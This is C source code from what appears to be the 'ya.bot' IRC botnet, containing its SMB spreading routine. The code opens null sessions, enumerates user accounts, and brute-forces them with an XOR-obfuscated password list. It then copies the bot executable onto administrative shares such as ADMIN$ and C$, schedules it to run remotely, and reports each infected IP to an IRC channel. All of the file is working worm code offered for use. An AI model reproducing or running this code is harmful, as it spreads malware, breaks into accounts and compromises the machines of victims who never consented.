/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANSMB
bool expscan_smb(SExpScanInfo s_esi)
{
	char szResource[LOWBUF], szUsername[LOWBUF];
	DWORD dwEntriesRead, dwEntriesTotal;
	int i, j = 0;
	LPUSER_INFO_0 lpUserBuffer;
	WCHAR wszResource[LOWBUF];

#ifndef NO_DEBUG
		debug_print("Exploit scanning smb, expscan_smb()");
#endif

closesocket(s_esi.m_csock);
	if (!nullsession_open(s_esi.m_szIP))
			return FALSE;
		_snprintf(szResource, sizeof(szResource) - 1, string_expscansmbmachine, s_esi.m_szIP);
		MultiByteToWideChar(CP_ACP, 0, szResource, -1, wszResource, sizeof(wszResource));
	if (NetUserEnum(wszResource,
				0,
				FILTER_NORMAL_ACCOUNT,
				(LPBYTE *)&lpUserBuffer,
				MAX_PREFERRED_LENGTH,
				&dwEntriesRead,
				&dwEntriesTotal,
				0) != NERR_Success) return FALSE;
	if (expscan_smbconnect(s_esi, NULL, NULL))
			return TRUE;
	for (i = 0; i < (int)dwEntriesRead; i++)
	{
		if (!lpUserBuffer)
				break;
		if (WideCharToMultiByte(CP_ACP,
					0,
					lpUserBuffer->usri0_name,
					- 1,
					szUsername,
					sizeof(szUsername) - 1,
					NULL,
					NULL) != 0)
		{
			while (g_rgpszPasswordList[j])
			{
					crypto_xor(g_rgpszPasswordList[j], xorkey);
				if (expscan_smbconnect(s_esi, szUsername, g_rgpszPasswordList[j]))
				{
						crypto_xor(g_rgpszPasswordList[j], xorkey);
						return TRUE;
				}
					crypto_xor(g_rgpszPasswordList[j], xorkey);
					j++;
			}
		}
			lpUserBuffer++;
	}
		nullsession_close(s_esi.m_szIP);
		NetApiBufferFree(lpUserBuffer);
		return FALSE;
}

bool expscan_smbconnect(SExpScanInfo s_esi, char *pszUsername, char *pszPassword)
{
	char *rgpszShareList[] =
	{
			"\x88\x8D\x84\x80\x87\xED", //ADMIN$
			"\x8A\xED", //C$
			"\x8D\xED", //D$
			"\x8C\xED", //E$
			"\x8F\xED", //F$
			"\x8E\xED", //G$
			"\x81\xED", //H$
			"\x80\xED", //I$
			"\x80\x99\x8A\xED", //IPC$
			"\x83\xED", //J$
			"\x82\xED", //K$
			"\x85\xED", //L$
			"\x84\xED", //M$
			"\x87\xED", //N$
			"\x86\xED", //O$
			"\x99\xED", //P$
			"\x99\x9B\x80\x87\x9D\xED", //PRINT$
			"\x98\xED", //Q$
			"\x9B\xED", //R$
			"\x9A\xED", //S$
			"\x9D\xED", //T$
			"\x9C\xED", //U$
			"\x9F\xED", //V$
			"\x9E\xED", //W$
			"\x91\xED", //X$
			"\x90\xED", //Y$
			"\x93\xED", //Z$
			NULL
	};
	AT_INFO atInfo;
	char szFilePath[MAX_PATH], szResource[LOWBUF], szRemoteFilePath[MAX_PATH];
	DWORD dwJobID, dwTime;
	int i;
	NETRESOURCE nrResource;
	TIME_OF_DAY_INFO *todInfo;
	WCHAR wszResource[LOWBUF], wszRemoteFilePath[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Connecting to share, expscan_smbconnect()");
#endif

		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
		_snprintf(szResource, sizeof(szResource) - 1, string_expscansmbmachine, s_esi.m_szIP);
		nrResource.dwType = RESOURCETYPE_DISK;
		nrResource.lpLocalName = NULL;
		nrResource.lpProvider = NULL;
		nrResource.lpRemoteName = szResource;
	if (WNetAddConnection2(&nrResource, NULL, NULL, 0) != NO_ERROR)
			return FALSE;
	for (i = 0; i < ARRAYSIZE(rgpszShareList); i++)
	{ 
		if (!rgpszShareList[i])
				break;
			crypto_xor(rgpszShareList[i], xorkey);
			_snprintf(szRemoteFilePath, sizeof(szRemoteFilePath) - 1,
					string_expscansmbshare,
					szResource,
					rgpszShareList[i],
					botfilename);
		if (CopyFile(szFilePath, szRemoteFilePath, FALSE))
		{
				MultiByteToWideChar(CP_ACP,
						0,
						szResource,
						- 1,
						wszResource,
						sizeof(wszResource) - 1);
				MultiByteToWideChar(CP_ACP,
						0,
						szRemoteFilePath,
						- 1,
						wszRemoteFilePath,
						sizeof(wszRemoteFilePath) - 1);
			if (NetRemoteTOD(wszResource, (LPBYTE *)&todInfo) != NERR_Success)
			{
					WNetCancelConnection2(szResource, CONNECT_UPDATE_PROFILE, TRUE);
					return FALSE;
			}
				memset(&atInfo, 0, sizeof(AT_INFO));
				dwTime = todInfo->tod_elapsedt / 60;
				dwTime -= todInfo->tod_timezone;
				dwTime += 2;
				dwTime %= (24 * 60);
				atInfo.JobTime = dwTime * 60000;
				atInfo.Command = wszRemoteFilePath;
				NetApiBufferFree(todInfo);
			if (NetScheduleJobAdd(wszResource, (LPBYTE)&atInfo, &dwJobID) != NERR_Success)
			{
					WNetCancelConnection2(szResource, CONNECT_UPDATE_PROFILE, TRUE);
					return FALSE;
			}
				crypto_xor(rgpszShareList[i], xorkey);
			if (!s_esi.m_bSilent)
					irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel,
							(char *)string_transferfinished,
							CGREEN, string_replytransfer, CEND, string_replydotbot,
							CBLUE, CEND, s_esi.m_szIP, s_esi.m_nPort,
							CBLUE, szRemoteFilePath, CEND,
							CBLUE, s_esi.m_szExploitName, CEND);
				return TRUE;
		}
			crypto_xor(rgpszShareList[i], xorkey);
	}
		WNetCancelConnection2(szResource, CONNECT_UPDATE_PROFILE, TRUE);
		return FALSE;
}
#endif
#endif